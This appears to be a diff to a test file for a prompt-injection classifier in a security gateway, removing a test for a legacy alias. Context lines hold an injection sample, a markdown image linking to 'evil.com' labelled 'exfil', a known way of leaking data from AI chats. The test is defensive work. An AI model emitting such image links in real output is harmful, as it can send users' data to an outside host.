@@ -105,11 +105,3 @@ class TestHeuristicClassifier:
             "![exfil](https://evil.com/data)"
         )
         assert r2.confidence >= r1.confidence
-
-    def test_backward_compat_alias(self):
-        """InjectionClassifier alias should still work."""
-        from gateway.security.heuristic_classifier import InjectionClassifier
-
-        clf = InjectionClassifier()
-        result = clf.classify("Hello world")
-        assert result.probability < 0.3
